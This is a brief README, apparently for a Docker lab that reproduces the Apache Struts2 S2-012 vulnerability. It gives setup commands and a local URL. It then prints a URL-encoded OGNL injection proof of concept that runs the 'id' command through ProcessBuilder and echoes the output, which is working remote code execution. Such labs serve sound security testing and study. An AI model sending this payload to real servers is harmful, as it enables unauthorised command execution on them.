### s2-012 vuldocker

## 测试环境搭建

```
docker-compose build
docker-compose up -d

安全完之后直接访问http://0.0.0.0:30080
```

```
poc:
%25%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%22id%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D

```

![1.png](https://raw.githubusercontent.com/Loneyers/vuldocker/master/struts2/s2-012/1.png)

